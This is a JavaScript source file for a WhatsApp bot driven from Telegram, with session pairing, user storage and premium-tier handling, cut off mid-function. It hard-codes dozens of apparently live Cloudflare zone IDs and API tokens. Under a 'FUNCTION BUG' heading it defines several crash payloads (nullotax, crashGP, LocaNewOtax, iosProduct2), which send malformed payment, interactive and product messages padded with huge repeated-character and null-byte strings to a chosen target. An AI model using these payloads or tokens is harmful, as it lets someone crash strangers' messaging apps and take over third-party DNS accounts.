const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@whiskeysockets/baileys');

const { Api } = require("telegram");
const { NewMessage } = require("telegram/events");
const axios = require('axios');
const os = require('os');
const { v4: uuidv4 } = require('uuid');
const FormData = require('form-data');
const pino = require('pino');
const fs = require("fs");
const path = require("path");
const JsConfuser = require("js-confuser");

const logger = pino({ level: 'silent' });

const config = require('../../config');
const { formatDuration, features, groupedFeatures, categoryIcons, escapeHtml } = require('../lib/commands');

const usernameBot = config.botUsername;

global.subdomain = { 
    "naell.my.id": { 
        zone: "090a81422da7b258cdf3ef02de1e4ca3",
        apitoken: "hmph2bybLMWa-_4EgVhQqi3lSXYaKgWgyXVMwzm_",
    },
    "naell.cloud": { 
        zone: "1b662cae2a8214a8468c97fb552070d0",
        apitoken: "EX4ezkgaSvD3JeXeKoDQzfmqI_Mh0yUek7WmDO0u",
    },
        "mirayyx.my.id": { 
        zone: "7f35ad56bdff93102cb8c31828a9400c",
        apitoken: "1t0gmOWF5LIsSmGp_6JyW7Z9hKUo12UrK_ejBXcP",
    },
    "xjunzpremium.my.id": { 
        zone: "d87a749a8f674974a6391fc5e2b49a15",
        apitoken: "f3v6EalATM5I4fUw72G3W9IzWa0Z1XMeXEhlsqJl",
    },
    "xpublicpanel.biz.id": { 
        zone: "f962f396d287f4b449dd26f58929d124",
        apitoken: "VBIU6ymH0ynZzArcAj16P1KXwM0u1UcgObiA0cEL",
    },
    "ekikjembot.my.id": { 
        zone: "60838a8c9313e842a766aa04a4ccb8d2",
        apitoken: "s2mB8fIboB5PX8G_yNxs4siiH-4Ck2T3Vl1JOXKB",
    },
    "xjunzstore.my.id": { 
        zone: "93f54512ef6fb4edbd6bb40385e01f41",
        apitoken: "j07xFaCSUA_Py7YJom5ouGlLTtB4kqPGSJ4Xmh03",
    },
    "infinitycloud.my.id": { 
        zone: "b4b34627adc861ba0fc0e1451eaf1fef",
        apitoken: "Pp9T7srj_VTwx_lYsXOl2u4X1HFWFJ844znoI2IH",
    }, 
    "pterodactyl-vip.my.id": { 
        zone: "3b199fe40bae1e72770c0b2e7e02e0d7",
        apitoken: "Odmo2uZw9amrvpUJqh0UFP472yEz5LAFV",
    },
    "vipcloud.biz.id": { 
        zone: "7d10341f505442364a7983e13e48fb22",
        apitoken: "Oz3s56kHMVvL6Q9SRxbcFYk2FOzNbrK2m38vtqlx",
    },
    "xpanelptd.my.id": { 
        zone: "03d03e224b295310670da4655e578c91",
        apitoken: "8ijKbN4iDDUmd139PdyVPNL0GOKyks1mCpWzmwCI",
    },
    "privateeserverr.my.id": {
        zone: "2b47743c5a3afecde36ffa0f52073270",
        apitoken: "2ltJMUmL2QZ-H3IQ0NGM8n84zxoJlU1D8Wwj26AB"
    },
    "publicserverr.my.id": {
        zone: "b23d82b98aa932317c93571a3846240a",
        apitoken: "2ltJMUmL2QZ-H3IQ0NGM8n84zxoJlU1D8Wwj26AB"
    },
    "storedigital.web.id": {
      zone: "2ce8a2f880534806e2f463e3eec68d31",
      apitoken: "v5_unJTqruXV_x-5uj0dT5_Q4QAPThJbXzC2MmOQ"
    },
    "mamhost.biz.id": {
      zone: "d88dccee1fd5fd2dcd47ddb7c91e2591",
      apitoken: "3rDda7Q7k6N19CXpfGVoq3WOpCatxmDlnQHVjWWC"
    },
    "xyzmam.biz.id": {
      zone: "49bb8266d07adee6b8b0999db470f45d",
      apitoken: "3rDda7Q7k6N19CXpfGVoq3WOpCatxmDlnQHVjWWC"
    },
    "xyzmamhost.my.id": {
      zone: "0b61c1c8287675fcbc9c5894cb3d1b92",
      apitoken: "3rDda7Q7k6N19CXpfGVoq3WOpCatxmDlnQHVjWWC"
    },
    "storeid.my.id": {
      zone: "c651c828a01962eb3c530513c7ad7dcf",
      apitoken: "N-D6fN6la7jY0AnvbWn9FcU6ZHuDitmFXd-JF04g"
    },
    "panel-freefire.biz.id": {
        zone: "2d7adf23d5ea185bead30c8ad14e1907",
        apitoken: "le350OqR25wWm5SpSJpcTbalOaTOKJA3FcRV4ohK"
        },
    "apcb.biz.id": {
        zone: "01592fa9553ff4692ed443e5932ff285", 
        apitoken: "le350OqR25wWm5SpSJpcTbalOaTOKJA3FcRV4ohK"
    }, 
    "bokepp.biz.id": {
        zone: "46b8cab5631c6c23c5ec4a7ef1f10803", 
        apitoken: "A8df8PxnKIcxLUTE7XS4TRZBoLslvt4XjJb1XEyi"
    }, 
    "gacorr.biz.id": {
        zone: "cff22ce1965394f1992c8dba4c3db539",
        apitoken: "v9kYfj5g2lcacvBaJHA_HRgNqBi9UlsVy0cm_EhT"
    },
    "cafee.my.id": {
        zone: "0d7044fc3e0d66189724952fa3b850ce", 
        apitoken: "wAOEzAfvb-L3vKYE2Xg8svJpHfNS_u2noWSReSzJ"
    }, 
    "vipstoree.my.id": {
        zone: "72fd03404485ddba1c753fc0bf47f0b3",
        apitoken: "J2_c07ypFEaen92RMS7irszQSrgZ_VFMfgNgzmp0"
    },
    "centzzcloud.my.id": {
        zone: "749f1d7d69e9329195761b570010c00f", 
        apitoken: "9Su8A1EDXnt9-yGDb7YSGlY_ogJAw2vR9IDtpFrQ"
    },
    "cupenpendiem.shop": {
        zone: "a70c572f7c8f8bc0ad5ac2552e42e516", 
        apitoken: "VEtKD6sBAvgwQd1pYBV957Rno1feXoxqXPo1biij"
    }, 
    "publicserver.my.id": {
        zone: "b1b16801d28009e899a843b0c8faee34",
        apitoken: "y_0WKCNCnOgx0sgbcQr-puVTXyTQPN9KErR9vlzN"
    },
    "hostingers-vvip.my.id": {
        zone: "2341ae01634b852230b7521af26c261f", 
        apitoken: "Ztw1ouD8_lJf-QzRecgmijjsDJODFU4b-y697lPw"
    },
    "ekiofficial.web.id": {
        zone: "e1b037c00268cae95076b58f7f78b1f6", 
        apitoken: "EJO7mHrBORH9XoQrnUvBqotMYxNm5bjB5UO2PeQE"
    },
    "eki-panelpvrt.my.id": {
        zone: "6b4cb792b77b6118e91d8604253ca572", 
        apitoken: "DsftwwFCAKrbSo-9r9hxqcscMw8Xvx8gQzTXMSz4"
    },
    "hostingers-vvip.my.id": {
        zone: "2341ae01634b852230b7521af26c261f",
        apitoken: "Ztw1ouD8_lJf-QzRecgmijjsDJODFU4b-y697lPw"
    },
    "hostsatoruu.biz.id": {
        zone: "30ea1aac05ca26dda61540e172f52ff4", 
        apitoken: "eZp1wNcc0Mj-btUQQ1cDIek2NZ6u1YW1Bxc2SB3z"
    },
    "kenz-host.my.id": {
        zone: "df24766ae8eeb04b330b71b5facde5f4",
        apitoken: "fyaxLxD0jNONtMWK3AmnaiLkkWi5Wg3Y9h8nqJh6"
    },
    "panelpro.fun": {
        zone: "a5c4697e86cf1cda49c0f81a699a690e",
        apitoken: "k-ZxmwqjyZf7iu4zNSJDTIx2tH6JZ--JQgfZReM9"
    },
    "pterodactyl-panel.web.id": {
        zone: "d69feb7345d9e4dd5cfd7cce29e7d5b0",
        apitoken: "32zZwadzwc7qB4mzuDBJkk1xFyoQ2Grr27mAfJcB"
    },
    "storedigital.web.id": {
        zone: "2ce8a2f880534806e2f463e3eec68d31",
        apitoken: "v5_unJTqruXV_x-5uj0dT5_Q4QAPThJbXzC2MmOQ"
    },
    "store-panell.my.id": {
        zone: "0189ecfadb9cf2c4a311c0a3ec8f0d5c", 
        apitoken: "eVI-BXIXNEQtBqLpdvuitAR5nXC2bLj6jw365JPZ"
    }, 
    "wannhosting.biz.id": {
        zone: "4e6fe33fb08c27d97389cad0246bfd9b",
        apitoken: "75HrVBzSVObD611RkuNS1ZKsL5A_b8kuiCs26-f9"
    },   
    "wannhosting.my.id": {
        zone: "0b36d11edd793b3f702e0591f0424339",
        apitoken: "OsSjhDZLdHImYTX8fdeiP1wocKwVnoPw5EiI85IF"
    }, 
    "xpanelprivate.my.id": {
        zone: "f6bd04c23d4de3ec6d60d8eeabe1ff40", 
        apitoken: "su_zz3Amd5WkrOv95OA6uQb1Y6ky6qVtjkhQnPCi"
    },
    "bokepp.biz.id": {
        zone: "46b8cab5631c6c23c5ec4a7ef1f10803", 
        apitoken: "A8df8PxnKIcxLUTE7XS4TRZBoLslvt4XjJb1XEyi"
    }, 
    "brannmarket.biz.id": {
        zone: "d8fcdee77abf68fc1fd39e8c8ff4fe3f",
        apitoken: "_d5Sm2sdygEcA8ycWT05bfKkTlJNy-vKcOBPjWdz"
    },
    "cafee.my.id": {
        zone: "0d7044fc3e0d66189724952fa3b850ce", 
        apitoken: "wAOEzAfvb-L3vKYE2Xg8svJpHfNS_u2noWSReSzJ"
    },
    "lightsecret.my.id": {
         zone: "e34c31e55b96bcc90c925f21dbe3f5ac",
         apitoken: "yDtnVxibxU8L0nVOMiZ71Qv1SzOzkT3zhbjsLHgQ"
    },
    "lightsecretaja.web.id": {
         zone: "68ca80984086afc9bf4909c81ebd1f85",
         apitoken: "Cn5WHHw81TGRwuFahaYsDllba7xAaz1RpMdxykE5"
    },
    "bot-wa-lightsecret.my.id": {
         zone: "52233f7bec570d42092bc887ff2e9ea1",
         apitoken: "CG984ovHlLM6uG5arMaGR65xNBQL9k4yDwvNxdGB"
    },
    "syahxkenny.my.id": {
         zone: "ea550795337edd3c491567cab062bd5a",
         apitoken: "8bbmzo8kxwtdgdezfer2xct7l_tamkhjrsjnuomt"
    }
};

const databasefile = require('../lib/database.json');

function loaddatabase() {
  if (fs.existsSync(databasefile)) {
    try {
      const raw = fs.readFileSync(databasefile);
      return JSON.parse(raw);
    } catch (err) {
      console.error('Error reading DB file:', err);
      return {
        chats: {}
      };
    }
  } else {
    return {
      chats: {}
    };
  }
}

function saveDB(db) {
  fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
}
global.db = loaddatabase();
if (global.db) global.db = {
  sticker: {},
  database: {},
  game: {},
  others: {},
  users: {},
  chats: {},
  erpg: {},
  settings: {},
  ...(global.db || {})
}

// ======================================
// FUNGSI TAGALL
const tagallChats = new Set();

const emojiCategories = {
  smileys: ["😀","😃","😄","😁","😆","😅","😂","🤣","😊","😍","🥰","😘","😎","🥳","😇","🙃","😋","😛","🤪"],
  animals: ["🐶","🐱","🐰","🐻","🐼","🦁","🐸","🦊","🦔","🦄","🐢","🐠","🐦","🦜","🦢","🦚","🦓","🐅","🦔"],
  food: ["🍎","🍕","🍔","🍟","🍩","🍦","🍓","🥪","🍣","🍔","🍕","🍝","🍤","🥗","🥐","🍪","🍰","🍫","🥤"],
  nature: ["🌲","🌺","🌞","🌈","🌊","🌍","🍁","🌻","🌸","🌴","🌵","🍃","🍂","🌼","🌱","🌾","🍄","🌿","🌳"],
  travel: ["✈️","🚀","🚲","🚗","⛵","🏔️","🚁","🚂","🏍️","🚢","🚆","🛴","🛸","🛶","🚟","🚈","🛵","🛎️","🚔"],
  sports: ["⚽","🏀","🎾","🏈","🎱","🏓","🥊","⛳","🏋️","🏄","🤸","🏹","🥋","🛹","🥏","🎯","🥇","🏆","🥅"],
  music: ["🎵","🎶","🎤","🎧","🎼","🎸","🥁","🎷","🎺","🎻","🪕","🎹","🔊"],
  celebration: ["🎉","🎊","🥳","🎈","🎁","🍰","🧁","🥂","🍾","🎆","🎇"],
  work: ["💼","👔","👓","📚","✏️","📆","🖥️","🖊️","📂","📌","📎"],
  emotions: ["❤️","💔","😢","😭","😠","😡","😊","😃","🙄","😳","😇","😍"],
};

function randomEmoji() {
  const cats = Object.keys(emojiCategories);
  const cat = cats[Math.floor(Math.random() * cats.length)];
  const arr = emojiCategories[cat];
  return arr[Math.floor(Math.random() * arr.length)];
}

// =======================================
// Save Prefix
const DATA_DIR = path.join(__dirname, '../data');
const PREFIX_FILE = path.join(DATA_DIR, 'prefix.json');

function initPrefixFile() {
  if (!fs.existsSync(PREFIX_FILE)) {
    fs.writeFileSync(PREFIX_FILE, JSON.stringify({}, null, 2));
  }
}

function readPrefixData() {
  try {
    initPrefixFile();
    const data = fs.readFileSync(PREFIX_FILE, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    return {};
  }
}

function writePrefixData(data) {
  try {
    fs.writeFileSync(PREFIX_FILE, JSON.stringify(data, null, 2));
    return true;
  } catch (error) {
    return false;
  }
}

function getUserPrefix(userId) {
  const prefixData = readPrefixData();
  return prefixData[userId] || '.'; 
}

function saveUserPrefix(userId, newPrefix) {
  const prefixData = readPrefixData();
  prefixData[userId] = newPrefix;
  const success = writePrefixData(prefixData);
  
  if (success) {
    console.log(`✅ Prefix user ${userId} berhasil disimpan: "${newPrefix}"`);
  } else {
    console.log(`❌ Gagal menyimpan prefix user ${userId}`);
  }
  
  return success;
}

initPrefixFile();

// SAVE AFK
const AFK_FILE = path.join(DATA_DIR, 'afk.json');

function initAfkFile() {
  if (!fs.existsSync(AFK_FILE)) {
    const defaultData = {};
    fs.writeFileSync(AFK_FILE, JSON.stringify(defaultData, null, 2));
  }
}

function readAfkData() {
  try {
    initAfkFile();
    const data = fs.readFileSync(AFK_FILE, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    console.error('Error membaca file afk.json:', error);
    return {};
  }
}

function writeAfkData(data) {
  try {
    fs.writeFileSync(AFK_FILE, JSON.stringify(data, null, 2));
    return true;
  } catch (error) {
    console.error('Error menulis file afk.json:', error);
    return false;
  }
}

function getUserAfk(userId) {
  const afkData = readAfkData();
  
  if (afkData[userId]) {
    return afkData[userId];
  }
  
  return {
    active: false,
    reason: "",
    timestamp: 0
  };
}

function saveUserAfk(userId, active, reason = "") {
  const afkData = readAfkData();
  
  if (active) {
    afkData[userId] = {
      active: true,
      reason: reason,
      timestamp: Date.now()
    };
  } else {
    if (afkData[userId]) {
      delete afkData[userId];
    }
  }
  
  const success = writeAfkData(afkData);
  
  if (success && active) {

  } else if (success && !active) {

  } else {

  }
  
  return success;
}

initAfkFile();

function getAllActiveAfkUsers() {
  const afkData = readAfkData();
  const activeUsers = [];
  
  for (const userId in afkData) {
    if (afkData[userId].active) {
      activeUsers.push({
        userId: userId,
        reason: afkData[userId].reason,
        timestamp: afkData[userId].timestamp
      });
    }
  }
  
  return activeUsers;
}

function resetAllAfkData() {
  const emptyData = {};
  return writeAfkData(emptyData);
}

// ======================================
// Shared data store – sinkron dengan botHandlers
const ds = require('../lib/dataStore');
const OWNER_ID = config.ownerId;

// Alias supaya kode di bawah tidak perlu diubah
const premiumUsers      = ds.premiumUsers;
const sellerUsers       = ds.sellerUsers;
const adminUsers        = ds.adminUsers;
const ultraPremiumUsers = ds.ultraPremiumUsers;

function ensureDataDir() {
    ds.saveAllData(); // delegate
}

function loadPremiumData() {
    ds.loadAllData();
}

function savePremiumData() {
    ds.saveAllData();
}

function isUserPremium(userId)  { return ds.isUserPremium(userId); }
function isUserUltra(userId)    { return ds.isUserUltra(userId); }
function isUserSeller(userId)   { return ds.isUserSeller(userId); }
function isUserAdmin(userId)    { return ds.isUserAdmin(userId, OWNER_ID); }
function isUserOwner(userId)    { return ds.isUserOwner(userId, OWNER_ID); }
function getPremiumInfo(userId) { return ds.getPremiumInfo(userId); }

function addPremiumUser(userId, months = 1, addedBy = 'system') {
    return ds.addPremiumUser(userId.toString(), months, addedBy.toString());
}
function removePremiumUser(userId) { return ds.removePremiumUser(userId); }
function addSeller(userId)         { return ds.addSeller(userId); }
function removeSeller(userId)      { return ds.removeSeller(userId); }
function addAdmin(userId)          { return ds.addAdmin(userId); }
function removeAdmin(userId)       { const removed = ds.adminUsers.delete(userId.toString()); if (removed) ds.saveAllData(); return removed;
    if (removed) savePremiumData();
    return removed;
}

function addUltra(userId) {
    const added = ultraPremiumUsers.add(userId.toString());
    if (added) savePremiumData();
    return added;
}

function removeUltra(userId) {
    const removed = ultraPremiumUsers.delete(userId.toString());
    if (removed) savePremiumData();
    return removed;
}

// User states per session
const userStates = new Map();

// Blacklist per user
const blacklistFile = path.join(DATA_DIR, 'blacklist.json');

function loadBlacklist() {
    try {
        if (fs.existsSync(blacklistFile)) {
            const data = fs.readFileSync(blacklistFile, 'utf8');
            return JSON.parse(data);
        }
    } catch (error) {
        console.error('Error loading blacklist:', error);
    }
    return {};
}

function saveBlacklist(blacklist) {
    try {
        fs.writeFileSync(blacklistFile, JSON.stringify(blacklist, null, 2));
    } catch (error) {
        console.error('Error saving blacklist:', error);
    }
}

let blacklistData = loadBlacklist();

function getUserBlacklist(userId) {
    return blacklistData[userId] || [];
}

function saveUserBlacklist(userId, userBlacklist) {
    blacklistData[userId] = userBlacklist;
    saveBlacklist(blacklistData);
}

// Notes per user
const noteFile = path.join(DATA_DIR, "notes.json");

function loadNotes() {
  try {
    if (fs.existsSync(noteFile)) {
      return JSON.parse(fs.readFileSync(noteFile));
    }
    return {};
  } catch {
    return {};
  }
}

function saveNotes(notes) {
  fs.writeFileSync(noteFile, JSON.stringify(notes, null, 2));
}

function getUserNotes(userId) {
  const notes = loadNotes();
  return notes[userId] || {};
}

function saveUserNotes(userId, userNotes) {
  const notes = loadNotes();
  notes[userId] = userNotes;
  saveNotes(notes);
}

// Auto forward state
let autoFwStates = new Map();
let autoFwInterval = null;
let autoFwMessage = null;
let autoFwChatId = null;
let autoFwRound = 0;
let autoFwDelayMinutes = 0;
let autoFwReportMessage = null; 
// ===================================

const sessions = new Map();
const SESSIONS_DIR = path.join(__dirname, 'sessions');
const SESSIONS_FILE = path.join(__dirname, 'sessions.json');

if (!fs.existsSync(SESSIONS_DIR)) {
  fs.mkdirSync(SESSIONS_DIR, { recursive: true });
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

let sock;

const silentLogger = {
    level: 'silent',
    trace: () => {},
    debug: () => {},
    info: () => {},
    warn: () => {},
    error: () => {},
    fatal: () => {}
};

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections(client) {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: false,
          logger: logger,
          defaultQueryTimeoutMs: undefined,
        });

        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections(client);
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(client, botNumber, chatId) {
  let statusMessage = await client.sendMessage(
    chatId,
    {
      message: `<blockquote>🚀 ᴏᴛᴡ ᴍᴇɴɢʜᴜʙᴜɴɢᴋᴀɴ ᴋᴇ ᴡʜᴀᴛsᴀᴘᴘ
╰➤ ɴᴜᴍʙᴇʀ  : ${botNumber} 
╰➤ sᴛᴀᴛᴜs : ᴘʀᴏɢʀᴇss...</blockquote>`,
      parseMode: "html"
    }
  );

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: logger,
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      
      await client.deleteMessages(chatId, [statusMessage.id], { revoke: true });
      
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await client.sendMessage(chatId, {
          message: `<blockquote>🔄 ᴄᴏɴɴᴇᴄᴛ ᴛᴏ ᴡʜᴀᴛsᴀᴘᴘ
╰➤ ɴᴜᴍʙᴇʀ  : ${botNumber} 
╰➤ sᴛᴀᴛᴜs : ᴍᴇɴᴄᴏʙᴀ ᴍᴇɴɢʜᴜʙᴜɴɢᴋᴀɴ</blockquote>`,
          parseMode: "html"
        });
        await connectToWhatsApp(client, botNumber, chatId);
      } else {
        await client.sendMessage(chatId, {
          message: `<blockquote>⚠️ ɢᴀɢᴀʟ ᴍᴇᴍᴜᴀᴛ ᴘᴀɪʀɪɴɢ
╰➤ ɴᴜᴍʙᴇʀ  : ${botNumber} 
╰➤ sᴛᴀᴛᴜs : ɢᴀɢᴀʟ ᴛᴇʀʜᴜʙᴜɴɢ</blockquote>`,
          parseMode: "html"
        });
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      
      await client.deleteMessages(chatId, [statusMessage.id], { revoke: true });
      
      await client.sendMessage(chatId, {
        message: `<blockquote>✅️ ʙᴇʀʜᴀsɪʟ ᴘʀᴏɢʀᴇss ᴘᴀɪʀɪɴɢ
╰➤ ɴᴜᴍʙᴇʀ  : ${botNumber} 
╰➤ sᴛᴀᴛᴜs : ᴘᴀɪʀɪɴɢ
╰➤ ᴘᴇsᴀɴ : sᴜᴄᴄᴇs ᴘᴀɪʀɪɴɢ</blockquote>`,
        parseMode: "html"
      });
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, "SUIKAA12");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          
          await client.deleteMessages(chatId, [statusMessage.id], { revoke: true });
          
          await client.sendMessage(chatId, {
            message: `<blockquote>⌛️ ᴘʀᴏɢʀᴇss ᴍᴇᴍᴜᴀᴛ ᴘᴀɪʀɪɴɢ
╰➤ ɴᴜᴍʙᴇʀ  : ${botNumber} 
╰➤ sᴛᴀᴛᴜs : ᴘᴀɪʀɪɴɢ
╰➤ ᴋᴏᴅᴇ : ${formattedCode}</blockquote>`,
            parseMode: "html"
          });
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        
        await client.deleteMessages(chatId, [statusMessage.id], { revoke: true });
        
        await client.sendMessage(chatId, {
          message: `<blockquote>❌️ ɢᴀɢᴀʟ ᴍᴇᴍᴘʀᴏsᴇs ᴘᴀɪʀɪɴɢ
╰➤ ɴᴜᴍʙᴇʀ  : ${botNumber} 
╰➤ sᴛᴀᴛᴜs : ᴇʀᴏʀʀ
╰➤ ᴘᴇsᴀɴ : ${error.message}</blockquote>`,
          parseMode: "html"
        });
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

initializeWhatsAppConnections();

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// === TARO FUNCTION BUG ===
async function nullotax(sock, target) {
  await sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          requestPaymentMessage: {
            currencyCodeIso4217: "IDR",
            requestFrom: target,
            expiryTimestamp: null,
            noteMessage: null,
            contextInfo: {
              isForwarded: true,
              forwardingScore: 999,
              forwardedNewsletterMessageInfo: {
                newsletterName: "OtaxUdang",
                newsletterJid: "1@newsletter"
              },
              quotedMessage: {
                sendPaymentMessage: {
                  noteMessage: null,
                  requestMessageKey: undefined, 
                  background: null
                }
              }
            }
          }
        }
      }
    },
    {
      participant: { jid: target },
      messageId: null
    }
  )
}

async function crashGP(sock, target) {
await sock.relayMessage(target, {
  "interactiveMessage": {
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "review_and_pay",
          "buttonParamsJson": `{\"currency\":\"IDR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":800,\"offset\":100},\"reference_id\":\"4TU82OG2957\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"description\":\"\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-2c7378a6-1643-4dba-8b2d-23e556a81ad4\",\"name\":\"Yakuza\",\"amount\":{\"value\":800,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"xtx\",\"native_payment_methods\":[],\"share_payment_status\":false}`
          }
        ]
      }
    }
  }, {});
}

async function LocaNewOtax(sock, target) {
  const otaxx = proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            locationMessage: {
              degreesLatitude: 11.11,
              degreesLongitude: -11.11,
              name: "DO YOU KNOW ME?¿ OTAX" + "ꦽ".repeat(60000),
              url: "https://t.me/Otapengenkawin",
              contextInfo: {
                externalAdReply: {
                  quotedAd: {
                    advertiserName: "ꦾ".repeat(60000),
                    mediaType: "IMAGE",
                    jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/", "base64"),
                    caption: "οταϰ ιѕ нєяє"
                  },
                  placeholderKey: {
                    remoteJid: "0@g.us",
                    fromMe: true,
                    id: "ABCDEF1234567890"
                  }
                }
              }
            },
            hasMediaAttachment: true
          },
          body: {
            text: "нαιι ιм οταϰ⸙"
          },
          nativeFlowMessage: {
            messageParamsJson: "{[",
            messageVersion: 3,
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: ""
              },
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "RIVIEW",
                  flow_cta: "ꦽ".repeat(10000),
                  flow_message_version: "3"
                })
              },
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "RIVIEW",
                  flow_cta: "ꦾ".repeat(10000),
                  flow_message_version: "3"
                })
              }
            ]
          },
          quotedMessage: {
            interactiveResponseMessage: {
              nativeFlowResponseMessage: {
                version: 3,
                name: "call_permission_request",
                paramsJson: "\u0000".repeat(1045000)
              },
              body: {
                text: "Ewe Bang Enak",
                format: "DEFAULT"
              }
            }
          }
        }
      }
    }
  });

  const msg = await generateWAMessageFromContent(target, otaxx, { userJid: target });
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// BLANK IOS
async function iosProduct2(sock, target) {
 await sock.sendMessage(
    target,
    {
          productMessage: {
            title: "👁‍🗨⃟꙰。⃝𝐀𝐩𝐨𝐥𝐥𝐨 ‌ ‌⃰ ⌁ 𝐅𝐯𝐜𝐤𝐞𝐫.ꪸ⃟‼️  Ꮂ ⋆>",
            description: "👁‍🗨⃟꙰。⃝𝐀𝐩𝐨𝐥𝐥𝐨 ‌ ‌⃰ ⌁ 𝐅𝐯𝐜𝐤𝐞𝐫.ꪸ⃟‼️  Ꮂ ⋆>" + "𑇂𑆵𑆴𑆿".repeat(60000),
            thumbnail: { url: "https://files.catbox.moe/b8vwbf.png" },
            productId: "X99",
            retailerId: "X1Y1Z1",
            url: "https://t.me/xrelly",
            body: "🩸" + "𑇂𑆵𑆴𑆿".repeat(1000),
            footer: "🩸",
            contextInfo: {
              remoteJid: "13135559098@s.whatsapp.net",
              mentionedJid: "status@broadcast",
              participant: "13135559098@s.whatsapp.net",
              forwardingScore: 9999,
              isForwarded: true,
              businessMessageForwardInfo: {
                businessOwnerJid: "13135559098@s.whatsapp.net"
              },
              externalAdReply: {
                automatedGreetingMessageShown: true,
